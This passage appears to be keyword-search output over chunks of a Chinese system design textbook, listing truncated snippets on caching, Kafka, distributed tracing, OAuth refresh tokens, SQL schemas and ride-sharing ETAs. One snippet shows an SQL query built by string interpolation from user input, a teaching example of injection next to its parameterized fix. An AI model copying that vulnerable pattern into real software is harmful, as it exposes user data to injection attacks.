  c09_b14.md: ...REST 的 `GET /feed` 可在 CDN 或浏览器层缓存（HTTP 层缓存）。GraphQL 查询是带自定义 query body 的 POST 请求，HTTP 缓存不适用。缓存必须在应用层处理——要么在 GraphQL 客户端（如 Apo...
  c11_b13.md: ...if cached:             return cached         profile = db.query("SELECT * FROM users WHERE id = %s", [user_id])         loc...
  c11_b14.md: ...return json.loads(cached)         profile = db.query("SELECT * FROM users WHERE id = %s", [user_id])         red...
  c19_b06.md: ...考虑这段代码（伪代码）：       user_input = request.get("username")     query = f"SELECT * FROM users WHERE username = '{user_input}'"...
  c19_b06.md: ...化查询（parameterized queries）**（也称 prepared statements）：       query = "SELECT * FROM users WHERE username = ?"     db.execute(q...

=== notifications (11 occurrences) ===
  c08_b13.md: ...users 表的数据：用户名、简介、头像 URL、加入日期等稳定字段。通知计数不是 users 表的一部分——它来自 notifications 表，频繁变化（每次点赞、评论、关注等）。  如果通知计数被包含在资料缓存 key 中，每个 incoming 通知都会...
  c13_b12.md: ...cialSnap 团队决定拆分单体。帖子功能和通知功能当前纠缠在一起：帖子创建代码直接在创建帖子的 SQL 事务中向 `notifications` 表插行。描述一个把它们拆成两个服务而不在迁移期间造成服务停机的分步计划。  提示  绞杀者无花果模式（Strangl...
  c13_b12.md: ...on Service 消费该事件。  **第 2 步：增加事件发布但不删除旧代码。** 修改帖子创建代码，在直接插入 `notifications` 表的同时，也发布 `post.created` 事件到队列。两条路径同时运行。这很安全，对用户无影响。  **第 3...
  c13_b12.md: ...Service。** Notification Service 消费 `post.created` 事件并插入自己的 `notifications` 表。部署它并验证它正确创建通知。`notifications` 表现在可能被重复创建（旧代码和新服务都在插入），但过...
  c13_b12.md: ...消费 `post.created` 事件并插入自己的 `notifications` 表。部署它并验证它正确创建通知。`notifications` 表现在可能被重复创建（旧代码和新服务都在插入），但过渡期可接受。  **第 4 步：验证 Notification...
  c13_b12.md: ...步：移除旧直接数据库访问。** 确信 Notification Service 正确后，从帖子创建代码中删除直接插入 `notifications` 表的逻辑。帖子创建代码现在只向队列发布事件。Notification Service 现在是 notificatio...
  c13_b12.md: ...tifications` 表的逻辑。帖子创建代码现在只向队列发布事件。Notification Service 现在是 notifications 表的唯一写入者。  **第 6 步：迁移通知数据存储。** 由于单体的 `notifications` 表现在只由 N...
  c13_b12.md: ...vice 现在是 notifications 表的唯一写入者。  **第 6 步：迁移通知数据存储。** 由于单体的 `notifications` 表现在只由 Notification Service 读写，把它迁移到 Notification Service 自...
  c13_b12.md: ...自己的数据库实例。更新 Notification Service 的连接配置。Posts Service 不再引用 `notifications` 表。  迁移全程没有停机。迁移是增量的，每一步都有安全的回滚路径。...
  c28_b20.md: ...创建每个团队？  **答案：** 60 名工程师时的目标架构：6 个服务（Auth、User、Product/Core、Notifications、Analytics、Platform/Infra），每个团队 10 人。倒推：阶段 1（0–6 个月，10 → 20...
  c28_b20.md: ...架构习惯。在实施前文档化“未来服务边界”。阶段 2（6–12 个月，20 → 35 人）：提取前两个服务：Auth 和 Notifications（都是低风险、边界清晰）。围绕这两个服务各组 6 人团队。剩余 23 人拥有核心单体。这两个服务分离后，团队可独立部署。...

=== span (11 occurrences) ===
  c17_b06.md: ...stributed trace）** 是单次请求通过分布式系统的端到端旅程记录。它由 **spans** 组成——每个 span 是一个工作单元，带开始时间和持续时间——以树形结构组织，每个 span 可能有子 span 代表下游调用。  plai...
  c17_b06.md: ...程记录。它由 **spans** 组成——每个 span 是一个工作单元，带开始时间和持续时间——以树形结构组织，每个 span 可能有子 span 代表下游调用。  plain 语言：追踪是一个完整时间线，准确显示哪些服务按什么顺序处理请求、每一...
  c17_b06.md: ...pans** 组成——每个 span 是一个工作单元，带开始时间和持续时间——以树形结构组织，每个 span 可能有子 span 代表下游调用。  plain 语言：追踪是一个完整时间线，准确显示哪些服务按什么顺序处理请求、每一步花多久—— sti...
  c17_b07.md: ...TP header：`X-Trace-ID: abc123`）。  处理请求的每个服务读取这个 header，记录一个 span，并在所有下游调用中传播 trace ID。每个 span 记录：trace ID、span ID（该 span 唯一）...
  c17_b07.md: ...`）。  处理请求的每个服务读取这个 header，记录一个 span，并在所有下游调用中传播 trace ID。每个 span 记录：trace ID、span ID（该 span 唯一）、parent span ID、服务名、操作名、开始时间戳...
  c17_b07.md: ...个 header，记录一个 span，并在所有下游调用中传播 trace ID。每个 span 记录：trace ID、span ID（该 span 唯一）、parent span ID、服务名、操作名、开始时间戳、结束时间戳，以及附加到 span...
  c17_b07.md: ...用中传播 trace ID。每个 span 记录：trace ID、span ID（该 span 唯一）、parent span ID、服务名、操作名、开始时间戳、结束时间戳，以及附加到 span 的标签或日志。  Spans 被发送到一个集中式追...
  c17_b07.md: ...span ID（该 span 唯一）、parent span ID、服务名、操作名、开始时间戳、结束时间戳，以及附加到 span 的标签或日志。  Spans 被发送到一个集中式追踪后端（Jaeger、Zipkin、Honeycomb、Datado...
  c17_b07.md: ...中式追踪后端（Jaeger、Zipkin、Honeycomb、Datadog APM），它通过 trace ID 拼接 span 树，重建追踪。工程师可以查询：“显示所有总时长超过 500ms 的追踪”或“显示请求 ID abc123 的追踪。”...
  c17_b09.md: ...r": "connection timeout"`。 * **分布式追踪**显示所有长耗时请求都有 Redis 超时的 span。  到 2:48——降级开始一分钟——on-call 工程师收到 page：“Redis 错误率 18%，p99 延迟...
  c17_b12.md: ...pans：API Gateway（10ms）、Auth Service（380ms）、Auth Service 下无子 span。Auth Service 对该 trace ID 的日志条目为：`INFO validate_jwt (5ms)`、`...

=== eta (11 occurrences) ===
  c25_b01.md: ...内与乘客匹配 * 乘客在地图上看到附近可用司机，持续更新 * 活跃司机每 4 秒发送一次位置更新 * 向乘客和司机显示 ETA 并持续更新 * 行程状态机：REQUESTED → ACCEPTED → DRIVER_ARRIVING → IN_T...
  c25_b05.md: ...### 25.4 ETA 计算——实时地图规模  ETA（预计到达时间）显示给乘客并随司机移动持续更新。计算 ETA 需要：  1. **道路网...
  c25_b05.md: ...### 25.4 ETA 计算——实时地图规模  ETA（预计到达时间）显示给乘客并随司机移动持续更新。计算 ETA 需要：  1. **道路网络图：** 有向图，节点是路口，...
  c25_b05.md: ...### 25.4 ETA 计算——实时地图规模  ETA（预计到达时间）显示给乘客并随司机移动持续更新。计算 ETA 需要：  1. **道路网络图：** 有向图，节点是路口，边是路段，权重代表典型通行时间 2. **最短路径算法：**...
  c25_b05.md: ...的变体） 3. **实时交通数据：** 根据当前交通状况调整边权重  对每次活跃行程（100 万同时行程）实时计算精确 ETA 在计算上不可行。技巧是 **分层预计算**：定期预计算 geohash 单元格（5km 区域）之间的 ETA。对具体司...
  c25_b05.md: ...计算精确 ETA 在计算上不可行。技巧是 **分层预计算**：定期预计算 geohash 单元格（5km 区域）之间的 ETA。对具体司机-乘客对，用预计算单元格-单元格 ETA 做快速近似，只有当司机在乘客 2 km 内时才计算精确最后一段 E...
  c25_b05.md: ...计算**：定期预计算 geohash 单元格（5km 区域）之间的 ETA。对具体司机-乘客对，用预计算单元格-单元格 ETA 做快速近似，只有当司机在乘客 2 km 内时才计算精确最后一段 ETA。  道路网络数据来自地图提供商（商业或开源如...
  c25_b05.md: ...A。对具体司机-乘客对，用预计算单元格-单元格 ETA 做快速近似，只有当司机在乘客 2 km 内时才计算精确最后一段 ETA。  道路网络数据来自地图提供商（商业或开源如 OpenStreetMap）。图很大——城市路网可能有 100 万个节点...
  c25_b07.md: ...计费 < 3 秒  事件流（Kafka）连接这些子系统：司机位置更新发布到 Kafka，由 geohash 索引更新器、ETA 重算服务、动态加价监控和乘客地图显示服务并行消费。  这是第 8 章事件驱动架构在拼车规模上的运行。每个消费者独立处理...
  c25_b11.md: ...消费者组模型中，每个消费者组维护自己独立的偏移——指向最后处理事件的指针。动态加价消费者组可能落后 1000 万事件；ETA 计算消费者组可能已完全赶上。这些偏移完全独立。Kafka 在配置保留期内（如 7 天）保留 topic 中所有事件；所...
  c25_b11.md: ...。Kafka 在配置保留期内（如 7 天）保留 topic 中所有事件；所有消费者组从同一不可变日志读取，但按自己节奏。ETA 计算和乘客地图显示：不受影响。它们继续以正常速率处理事件，不受动态加价组积压影响。它们不与动态加价组共享 Kafka...

=== exactly (10 occurrences) ===
  c02_b09.md: ...nce）：** 99.5% 的送达率（不是 100%）承认通知系统可能偶尔丢失事件。保证 100% 需要分布式系统中的 exactly-once 语义，代价很高（第 15 章）。那 0.5% 的 miss 率就是使用 at-least-once 配送加去...
  c02_b09.md: ....5% 的 miss 率就是使用 at-least-once 配送加去重（deduplication），而不是更复杂的 exactly-once 方案的成本。  **Q2.** 你正在设计一个银行转账系统。请把六个指标（latency、throughpu...
  c08_b02.md: ...理的速率工作，逐渐消化积压。  **顺序：** 大多数队列大致按 FIFO（先进先出）顺序投递消息，但在故障下保证完全 exactly-once 顺序很难。   ### 8.3 投递保证——最多一次、至少一次、正好一次  考虑这个场景。邮件服务处理队列里...
  c15_b03.md: ...理一次，不多不少）在分布式系统中不能作为原生原语实现。有些系统所谓“恰好一次”——例如 Kafka Streams 的 exactly-once 语义——是结合至少一次投递与幂等生产者和事务写来实现的，所以*效果*上像每条消息只处理一次。底层机制仍涉及重...
  c25_b04.md: ...强一致数据库存储行程状态和司机状态。这与金融交易原则相同：通过 ACID 属性（第 5 章）的数据库事务或分布式锁实现 exactly-once 语义。  回忆第 4 章：强一致性以可用性为代价。网络分区期间，强一致的匹配服务可能无法处理新 ride r...
  c25_b06.md: ...，系统必须向乘客收取正确金额并准确支付给司机。这些都是金融交易事务（transaction）。  要求严格：  * **Exactly once：** 每张信用卡每笔行程只扣一次 * **Atomicity：** 对乘客扣款与给司机账户入账必须同时发生或...
  c25_b06.md: ...同一请求，支付处理器也不会重复扣款。这就是 **idempotency key（幂等性键）** 模式，在分布式系统中对 exactly-once 金融操作至关重要。  * * *...
  c25_b06.md: ...，系统必须向乘客收取正确金额并准确支付给司机。这些都是金融交易事务（transaction）。  要求严格：  * **Exactly once：** 每张信用卡每笔行程只扣一次 * **Atomicity：** 对乘客扣款与给司机账户入账必须同时发生或...
  c25_b06.md: ...同一请求，支付处理器也不会重复扣款。这就是 **idempotency key（幂等性键）** 模式，在分布式系统中对 exactly-once 金融操作至关重要。  * * *...
  c25_b13.md: ...*计费** 应用第 5 章 ACID 属性和 idempotency key（幂等性键）模式，确保在网络故障和重试下的 exactly-once 金融交易事务（transaction）。  与第 24 章对比：视频流容忍数分钟准备延迟并利用预计算（转码、...

=== mbps (10 occurrences) ===
  c03_b04.md: ...ix 全球约 2.3 亿订阅用户 2. 假设峰值同时观看比例为 10%：2300 万并发流 3. 平均视频码率：约 5 Mbps（1080p HD） 4. 总带宽需求：2300 万 × 5 Mbps = 115 Tbps 5. 一台带 40 Gbp...
  c03_b04.md: ...：2300 万并发流 3. 平均视频码率：约 5 Mbps（1080p HD） 4. 总带宽需求：2300 万 × 5 Mbps = 115 Tbps 5. 一台带 40 Gbps 网络链路的 CDN 服务器可服务：40,000 Mbps / 5...
  c03_b04.md: ...× 5 Mbps = 115 Tbps 5. 一台带 40 Gbps 网络链路的 CDN 服务器可服务：40,000 Mbps / 5 Mbps = 8000 路流 6. CDN 服务器数量：2300 万 / 8000 = 2875 → 向上取整...
  c03_b04.md: ...= 115 Tbps 5. 一台带 40 Gbps 网络链路的 CDN 服务器可服务：40,000 Mbps / 5 Mbps = 8000 路流 6. CDN 服务器数量：2300 万 / 8000 = 2875 → 向上取整约 3000 台活...
  c03_b07.md: ...289 QPS 平均 → 870 QPS 峰值  如果 20% 的 Feed 加载包含一个自动播放视频，码率（比如）2 Mbps：...
  c03_b08.md: ...* 870 QPS × 20% = 174 个并发视频流 * 视频带宽：174 × 2 Mbps = **348 Mbps ≈ 0.35 Gbps** * 含文字/图片的总带宽：再加约 20 MB/s = 0.16...
  c03_b08.md: ...* 870 QPS × 20% = 174 个并发视频流 * 视频带宽：174 × 2 Mbps = **348 Mbps ≈ 0.35 Gbps** * 含文字/图片的总带宽：再加约 20 MB/s = 0.16 Gbps * **总峰值带...
  c03_b09.md: ...算处理时间。如果该 Feed 页 200 KB（10 条带缩略图的帖子），浏览器还要以典型跨洲带宽下载：有效吞吐 10 Mbps 时，这又要 160 ms。总最低延迟：约 310 ms，且假设服务器处理时间为零。  对比伦敦的 CDN 边缘节点。同...
  c24_b01.md: ...时观众 * 平均会话时长：40 分钟  **约束（证据）：**  * 1 亿（100 million）同时观众 × 5 Mbps 平均码率 = 500 Tbps 出站带宽 * 热门内容（最热 1% 视频）约占 80% 观看量 * 上传：每分钟上传...
  c24_b04.md: ...### 24.3 CDN——真正的交付引擎  回到需求：1 亿（100 million）同时观众 × 5 Mbps 平均码率 = 500 Tbps 出站带宽。  没有任何单一数据中心——甚至 10 个数据中心——能在全球低延迟下提供...

=== index (10 occurrences) ===
  c05_b03.md: ...”（O(log n) 查找），得到页码。  当你在 `posts.user_id` 上建索引：      CREATE INDEX idx_posts_user_id ON posts(user_id);  数据库会创建一个 B-tree，每个叶节点...
  c05_b06.md: ...d)     );          -- Indexes for common queries     CREATE INDEX idx_posts_user_id ON posts(user_id);     CREATE INDEX idx_p...
  c05_b06.md: ...REATE INDEX idx_posts_user_id ON posts(user_id);     CREATE INDEX idx_posts_created_at ON posts(created_at DESC);         CRE...
  c05_b06.md: ..._posts_created_at ON posts(created_at DESC);         CREATE INDEX idx_follows_followed_id ON follows(followed_id);  **为什么这样设计...
  c05_b10.md: ...t_id, user_id)     );          -- 快速找到提及某用户的所有帖子     CREATE INDEX idx_mentions_user_id ON mentions(user_id);     -- 快速找到某篇帖子提...
  c05_b10.md: ...对有几百万赞的热门帖子尤其如此。  **方案 1：在 `post_id` 上添加/修复索引**      CREATE INDEX idx_likes_post_id ON likes(post_id);...
  c05_b12.md: ...。  **最佳索引：** `(user_id, created_at DESC)` 复合索引：      CREATE INDEX idx_posts_user_created ON posts(user_id, created_at DESC);...
  c06_b11.md: ...created_at  TIMESTAMP DEFAULT NOW()     );     CREATE INDEX idx_hashtags_tag ON hashtags(tag);     CREATE INDEX idx_has...
  c06_b11.md: ...CREATE INDEX idx_hashtags_tag ON hashtags(tag);     CREATE INDEX idx_hashtags_created_at ON hashtags(created_at);   热门 hasht...
  c28_b14.md: ...(Ch 20) | 微小开销 | 强——不能过度放行 | 高 | 中——分布式状态维护每用户计数 **Inverted index (search)** (Ch 23) | 查询延迟极低（预计算） | 最终（新文档出现前有索引延迟） | 高（复制分片...

=== references (10 occurrences) ===
  c05_b06.md: ...id          SERIAL PRIMARY KEY,         user_id     INTEGER REFERENCES users(id) ON DELETE CASCADE,         content     TEXT NOT N...
  c05_b06.md: ...CREATE TABLE follows (         follower_id INTEGER REFERENCES users(id) ON DELETE CASCADE,         followed_id INTEGER RE...
  c05_b06.md: ...ES users(id) ON DELETE CASCADE,         followed_id INTEGER REFERENCES users(id) ON DELETE CASCADE,         created_at  TIMESTAMP...
  c05_b06.md: ...;          CREATE TABLE likes (         user_id     INTEGER REFERENCES users(id) ON DELETE CASCADE,         post_id     INTEGER RE...
  c05_b06.md: ...ES users(id) ON DELETE CASCADE,         post_id     INTEGER REFERENCES posts(id) ON DELETE CASCADE,         created_at  TIMESTAMP...
  c05_b10.md: ...**      CREATE TABLE mentions (         post_id     INTEGER REFERENCES posts(id) ON DELETE CASCADE,         user_id     INTEGER RE...
  c05_b10.md: ...ES posts(id) ON DELETE CASCADE,         user_id     INTEGER REFERENCES users(id) ON DELETE CASCADE,         created_at  TIMESTAMP...
  c06_b12.md: ...SERIAL PRIMARY KEY,         patient_id      INTEGER REFERENCES patients(id),         drug_name       VARCHAR(200) NOT NULL...
  c06_b12.md: ...SERIAL PRIMARY KEY,         patient_id      INTEGER REFERENCES patients(id),         note_type       VARCHAR(50),...
  c06_b12.md: ...ote_type       VARCHAR(50),         author_id       INTEGER REFERENCES users(id),         created_at      TIMESTAMP DEFAULT NOW(),...

=== return (10 occurrences) ===
  c07_b05.md: ...Write value to database     2. Write value to cache     3. Return success   **读取路径：**       1. Check cache — almost always a...
  c07_b05.md: ...ark the entry as "dirty" (pending flush to database)     3. Return success immediately     4. [Background process] Flush dirty...
  c07_b07.md: ...ached = redis.get(cache_key)         if cached:             return json.loads(cached)  # Cache hit          # Cache miss — que...
  c07_b07.md: ...redis.setex(cache_key, 300, json.dumps(profile))          return profile      def update_user_profile(user_id, new_bio):...
  c08_b07.md: ...r.signup" event to message queue (fast, ~2ms)         ↓     Return HTTP 200 "Account created!" to user         ↓     (Meanwhil...
  c08_b11.md: ...[user_id]         )          if already_sent:             return  # Idempotent: do nothing on duplicate          # Send the...
  c10_b07.md: ...hoto_key,             expiry_seconds=3600         )         return signed_url   签名 URL 包含用对象存储密钥生成的加密签名，在设定时间后过期。浏览器可以用这个 URL...
  c11_b04.md: ...json.dumps(session_data)    # value         )          return session_id      def get_session(session_id):         data =...
  c11_b04.md: ...session:{session_id}")         if data is None:             return None  # Session expired or invalid         return json.load...
  c11_b04.md: ...return None  # Session expired or invalid         return json.loads(data)   现在 Alice 在 Server A 登录时，会话存在 Redis 中——Se...

=== def (10 occurrences) ===
  c07_b07.md: ...↓ (on miss only)     PostgreSQL Database   **资料缓存：**       def get_user_profile(user_id):         cache_key = f"user:{user...
  c07_b07.md: ...key, 300, json.dumps(profile))          return profile      def update_user_profile(user_id, new_bio):         # Write to d...
  c08_b11.md: ...。如果消费者不幂等，重复消息造成重复效果：重复邮件、重复扣款、重复记录。  让“发送欢迎邮件”消费者幂等：       def process_signup_event(event):         user_id = event['user_...
  c10_b07.md: ...signed URLs）** 解决这个问题。应用不存储普通 URL，而是在提供内容时生成临时签名 URL：       def serve_private_photo(user_id, photo_key, requesting_user_id)...
  c11_b04.md: ...sessions = {}  # 服务器本地字典      # 之后：会话在 Redis 中（水平扩展正确）     def create_session(user_id, username):         session_id = gen...
  c11_b04.md: ..._data)    # value         )          return session_id      def get_session(session_id):         data = redis.get(f"session...
  c11_b13.md: ...第 8 章消息队列）SocialSnap 的用户资料 API 处理函数在新的三台服务器架构中包含以下逻辑：       def get_user_profile(user_id):         cache_key = f"user:{user...
  c11_b14.md: ...`local_cache` 换成共享 Redis 缓存，使用第 7 章的 cache-aside 模式：       def get_user_profile(user_id):         cache_key = f"user:{user...
  c11_b14.md: ...son.dumps(profile))  # 共享 Redis         return profile      def update_user_profile(user_id, new_data):         db.execute(...
  c11_b15.md: ...期）时，`DEL` 命令会删除 Redis 条目，随后所有服务器的后续请求都会重新生成并缓存新的 URL。       def get_presigned_url(user_id):         cache_key = f"presigned...

=== topic (10 occurrences) ===
  c08_b04.md: ...nup Service)         ↓     publishes "user.signup" event to topic         ↓     Message Broker         ├── delivers to Email...
  c08_b04.md: ...。它们互不干扰。日志文件不会因为某个程序读取了就删除条目——条目按配置保留一段时间。  Kafka 的核心数据结构是**topic partition（主题分区）**——一个跨多台服务器分区以实现可扩展性的只追加日志。生产者把消息追加到日志末尾。消费...
  c20_b10.md: ...库）能处理，但团队想添加实时仪表盘显示最近 5 分钟点击。  提示  考虑第 8 章的事件驱动模式。同一个 Kafka topic 可以有多个消费者。实时与批量分析有不同一致性要求——哪一个需要强保证？  **答案：** Kafka topic 已是...
  c20_b10.md: ...ka topic 可以有多个消费者。实时与批量分析有不同一致性要求——哪一个需要强保证？  **答案：** Kafka topic 已是 backbone。增强：向同一个 Kafka topic 添加第二个消费者， feeding 实时分析存储。...
  c20_b10.md: ...求——哪一个需要强保证？  **答案：** Kafka topic 已是 backbone。增强：向同一个 Kafka topic 添加第二个消费者， feeding 实时分析存储。  **架构：**...
  c20_b11.md: ...* Kafka topic `url_clicks` 接收点击事件（已有） * 消费者 1（已有）：批量事件写入数据仓库（用于历史查询，5 分钟延...
  c22_b07.md: ...是扇出架构的心脏：  * **水平可扩展：** 多个 Fanout Service worker 并行消费 Kafka topic。如果某帖子有 50 万（500,000）关注者，工作被分散到多个 worker。10 个 worker 各处理 5 万...
  c25_b11.md: ...次，正确倍数始终在行程记录中。  **Q3.** 如第 8 章所见，消息队列解耦生产者与消费者。拼车系统用 Kafka topic 处理司机位置事件。假设动态加价计算服务落后，积压了 1000 万（10 million）个事件。位置事件流的其他消费者...
  c25_b11.md: ...fka 消费者组模型如何保护它们？  提示  回忆 Kafka 消费者偏移模型如何工作。每个消费者维护自己的偏移——在 topic 中的当前位置。思考“落后”对一个消费者组 vs. 另一个意味着什么。  **答案：** Kafka 消费者组模型中，每...
  c25_b11.md: ...1000 万事件；ETA 计算消费者组可能已完全赶上。这些偏移完全独立。Kafka 在配置保留期内（如 7 天）保留 topic 中所有事件；所有消费者组从同一不可变日志读取，但按自己节奏。ETA 计算和乘客地图显示：不受影响。它们继续以正常速率处...

=== nvme (10 occurrences) ===
  c10_b02.md: ...TB * 存放内容：工作数据、活跃数据库缓冲池、缓存（Redis、Memcached）、进行中的计算  **第 3 级：NVMe SSD**  * 速度：约 100 微秒（0.1 毫秒） * 成本：约 0.10–0.30 USD/GB * 容量：每...
  c10_b03.md: ...。没有任何结构强加——这是上层系统的工作。  **你在哪里遇到块存储：**  * 服务器中的物理磁盘（SATA SSD、NVMe SSD、HDD） * 云块存储卷：Amazon EBS（Elastic Block Store）、Google Clo...
  c10_b03.md: ...ostgreSQL 写入 B-tree 索引更新（第 5 章）时，它是在向块设备写特定块。PostgreSQL 下面的 NVMe SSD 就是块存储。这就是为数据库性能选择正确磁盘类型的原因。   ### 10.3 文件存储——熟悉的抽象  **文...
  c10_b10.md: ...要多低延迟？**  * 亚毫秒级（缓存）→ DRAM（Redis、Memcached） * 个位数毫秒级（事务查询）→ NVMe 关系型数据库 * 几十毫秒可接受（媒体文件）→ 对象存储 + CDN * 分钟级可接受（长期归档）→ 冷存储（磁带、G...
  c10_b10.md: ...持久）  **第 5 步：成本约束是什么？**  * 100 GB 热用户数据 → DRAM（500 USD/月）vs NVMe SSD（10 USD/月）vs 对象存储（2 USD/月） * 1 PB 冷归档数据 → HDD（40,000 USD...
  c10_b10.md: ...DRAM (Redis) | ↓↓ 亚毫秒 | varies | ↑（如复制） | ↑（Redis 集群运维）   NVMe SSD (DB) | ↓ 个位数毫秒 | ↑（ACID） | ↑（RAID/副本） | ↑（DB 运维）   对象存储...
  c10_b11.md: ...：按 URL key 顺序读取大二进制对象。延迟要求：几十到几百毫秒可接受。成本：PB 级唯一经济可承受的分层。  **NVMe SSD 关系型数据库：**  最佳工作负载：电商订单管理。订单包含结构化数据（客户 ID、商品、价格、送货地址、状态）...
  c10_b12.md: ...慢 1,000 倍，而且无法在数据库所需的原子性和体积下执行。  对象存储的延迟（每次操作约 50-100ms）也比 NVMe SSD 访问（约 0.1ms）高 10-100 倍，使其根本不适合活跃数据库每秒数千次 I/O 操作的需求。  **Q...
  c10_b17.md: ...数据中心内往返约 1ms，远程可用区（availability zone，即可用性区域）往返 10-50ms。  本地 NVMe SSD 快正因为它不分布：一次写入到一个位置（一个 PCIe 总线上的物理设备）。没有网络，没有复制开销。但它的持久性...
  c10_b19.md: ...档的存储层级，反映了一个基本物理约束：速度和成本成反比。  **块存储**是基础——操作系统和数据库以低延迟访问原始块。NVMe SSD 代表了当前块存储性能的顶峰。  **文件存储**添加分层目录结构和多客户端访问。它是共享配置和日志文件的正确选...

=== refresh (10 occurrences) ===
  c11_b06.md: ...e 的 JWT，他们会一直用到过期。  存在 workaround：  * 短 JWT 过期时间（15 分钟）——需要 refresh token（自身带来复杂度） * Redis 中的“撤销列表”（被撤销 token ID 的集合）——但你重新引入了对...
  c19_b03.md: ...-to-server，不经过用户浏览器）。SocialSnap 返回一个 **access token** 和一个 **refresh token**。 4. PostScheduler 在 API 请求中使用 access token：`Authori...
  c19_b03.md: ...en 并按用户权限处理请求。 5. Access token 过期（通常 1 小时后）。PostScheduler 用 refresh token 获取新 access token，无需用户再次登录。  关键洞见：用户密码永远不会与 PostSchedu...
  c19_b03.md: ...常短的过期时间，否则做不到。  实践中：使用短生命周期的 access token（15–60 分钟）和较长生命周期的 refresh token。用户登出或账户被入侵时，使 refresh token 失效（存储在数据库中）。未来的 token ref...
  c19_b03.md: ...access token（15–60 分钟）和较长生命周期的 refresh token。用户登出或账户被入侵时，使 refresh token 失效（存储在数据库中）。未来的 token refresh 尝试失败，用户实际上无法获得新 access...
  c19_b03.md: ...esh token。用户登出或账户被入侵时，使 refresh token 失效（存储在数据库中）。未来的 token refresh 尝试失败，用户实际上无法获得新 access token——现有 token 在剩余短生命周期内仍有效，但损害有限。...
  c19_b14.md: ...pe` claim，确保请求操作在授予范围内。  **Token 刷新：** access token 过期时，应用把 refresh token 发到 token 端点。SocialSnap 在数据库（服务器（server）端状态）验证 refresh...
  c19_b14.md: ...refresh token 发到 token 端点。SocialSnap 在数据库（服务器（server）端状态）验证 refresh token，签发新 access token。如果 refresh token 被撤销，刷新失败。  **用户撤销：*...
  c19_b14.md: ...ap 在数据库（服务器（server）端状态）验证 refresh token，签发新 access token。如果 refresh token 被撤销，刷新失败。  **用户撤销：** 用户访问 SocialSnap 设置，看到“Connected...
  c19_b14.md: ...SocialSnap 设置，看到“Connected Apps”，撤销特定应用访问。SocialSnap 从数据库删除 refresh token。应用无法获得新 access token。现有 access token 在最长 1 小时内（或下次轮换前...

=== sorted (10 occurrences) ===
  c20_b11.md: ...消费者 1（已有）：批量事件写入数据仓库（用于历史查询，5 分钟延迟） * 消费者 2（新增）：把事件写入 Redis sorted set 或时序数据库（如 InfluxDB 或 Redis TimeSeries），滚动 5 分钟窗口  **实时仪表...
  c20_b11.md: ...* `url_clicks` Kafka 消费者（消费者 2）按 `short_code` 为键把事件写入 Redis sorted set，score 为时间戳，member 为点击事件。要获取最近 5 分钟点击：`ZRANGEBYSCORE url...
  c22_b04.md: ...#### Timeline 作为有序列表  Timeline 是按排序分数排序的帖子 ID 有序列表。Redis sorted set 非常合适：`user:F:timeline` 是一个 sorted set，每个 member 是 `post...
  c22_b04.md: ...分数排序的帖子 ID 有序列表。Redis sorted set 非常合适：`user:F:timeline` 是一个 sorted set，每个 member 是 `post_id`，score 是排序分数。Feed 获取即 `ZREVRANGEBY...
  c22_b04.md: ...0 20` —— 分数最高的 20 条帖子。  写时扇出：用户 U 发帖 P 时，系统把 P 加入每个关注者 F 的 sorted set：`ZADD user:F:timeline <ranking_score> <post_id>`。插入后，若...
  c22_b04.md: ...set：`ZADD user:F:timeline <ranking_score> <post_id>`。插入后，若 sorted set 超过最大大小（如 5000 条），删除最低分条目：`ZREMRANGEBYRANK user:F:timeli...
  c25_b03.md: ...：  1. 从 A 单元格集合中移除该司机 2. 把该司机加入 B 单元格集合 3. 更新司机位置键  用 Redis sorted set，单元格可用精确坐标作为分数存储司机 ID，实现单元格内细粒度距离排序。Redis 原生 `GEOADD` 和...
  c25_b03.md: ...司机 ID，实现单元格内细粒度距离排序。Redis 原生 `GEOADD` 和 `GEORADIUS` 命令直接在坐标 sorted set 编码上实现地理空间查询——本质上是内置的 geohash 类空间索引。   #### 位置数据新鲜度  位置更...
  c25_b08.md: ...CID 属性的永久记录：它是频繁覆盖的当前值，带 TTL。Redis 原生支持基于 TTL 的过期、用于地理空间索引的 sorted set 以及原子更新操作，是天然选择。持久化权衡（若 Redis 丢数据，最后 5 秒位置更新丢失）可接受，因为位置数...
  c26_b13.md: ...入吞吐 Redis——现在我们理解生产版该存储内部会是什么样子。第 22 章的 timeline 缓存依赖 Redis sorted set——现在我们理解使该存储可靠的复制和一致性模型。   ### 本章总结  本章从零开始设计了一个分布式键值存储，...

=== term (10 occurrences) ===
  c23_b04.md: ...st 增强  生产倒排索引在 posting list 中存的远不止文档 ID。典型 posting 包含：  * **Term frequency (TF)：** 该词在文档中出现多少次？提到 "distributed systems（分布式系统...
  c23_b04.md: ...少次？提到 "distributed systems（分布式系统）" 50 次的文档可能比只提到一次的更相关。 * **Term position：** 词出现在哪些位置（词索引）？这支持短语匹配（"distributed systems" 作为精...
  c23_b05.md: ...。查询 "distributed systems（分布式系统）" 必须命中两个分片（每个词一个），然后求交集。这叫 **term-based sharding**。  **按文档分片：** 每个分片拥有所有文档的一个子集，并为其文档子集维护完整的小...
  c23_b05.md: ...cument-based sharding，因为它允许最自然的并行：查询同时发往所有分片，每个分片并行产生结果，再合并。Term-based sharding 会产生倾斜问题（有些词远比其他词常见，造成热分片）且多词查询需要跨多个分片协调。  *...
  c23_b05.md: ...。查询 "distributed systems（分布式系统）" 必须命中两个分片（每个词一个），然后求交集。这叫 **term-based sharding**。  **按文档分片：** 每个分片拥有所有文档的一个子集，并为其文档子集维护完整的小...
  c23_b05.md: ...cument-based sharding，因为它允许最自然的并行：查询同时发往所有分片，每个分片并行产生结果，再合并。Term-based sharding 会产生倾斜问题（有些词远比其他词常见，造成热分片）且多词查询需要跨多个分片协调。  *...
  c23_b06.md: ...-IDF（Term Frequency - Inverse Document Frequency）的直觉是：  * **Term Frequency (TF)：** 一个词在文档中出现很多次，可能对文档很重要。如果 "consistency" 在文...
  c23_b06.md: ...它在这份文档中出现频繁，且在整个文档集中罕见。  TF-IDF(t,d)=TF(t,d)×IDF(t) TF(t,d)=term t 在 document d 中的次数 / document d 中的总词数 IDF(t)=log(总文档数 / 包含...
  c23_b06.md: ...-IDF（Term Frequency - Inverse Document Frequency）的直觉是：  * **Term Frequency (TF)：** 一个词在文档中出现很多次，可能对文档很重要。如果 "consistency" 在文...
  c23_b06.md: ...它在这份文档中出现频繁，且在整个文档集中罕见。  TF-IDF(t,d)=TF(t,d)×IDF(t) TF(t,d)=term t 在 document d 中的次数 / document d 中的总词数 IDF(t)=log(总文档数 / 包含...

=== anti (10 occurrences) ===
